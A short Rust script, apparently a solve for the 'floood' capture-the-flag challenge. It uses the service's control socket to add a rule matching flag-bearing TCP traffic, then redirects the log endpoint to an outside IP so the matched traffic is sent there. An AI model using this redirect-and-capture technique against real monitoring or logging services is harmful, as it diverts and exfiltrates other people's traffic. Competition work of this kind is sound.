// Control Traffic 19696/udp
// Tap Traffic: 19697/udp
// floood.challenges.ooo => 35.212.71.168
use floood::protocol::*;
use floood::ControlSocket;

fn main() {
    println!("[!] Starting..");

    let mut control = ControlSocket::new("floood.challenges.ooo:19696");

    dbg!(control.query(Request::GetRules));

    dbg!(control.query(Request::AddRule {
        rule: Rule::new(
            "r00timentary",
            IpProtocol::Tcp,
            "0.0.0.0/0",
            "0.0.0.0/0",
            None,
            None,
            ".*OOO.*(When can we get our Ph.D.)?"
        )
    }));

    dbg!(control.query(Request::SetLogEndpoint {
        address: String::from("128.61.240.70"),
        port: 12345
    }));

    loop {
        dbg!(control.query(Request::GetRules));
        dbg!(control.query(Request::GetTapEndpoint));
        dbg!(control.query(Request::GetLogEndpoint));
    }
}
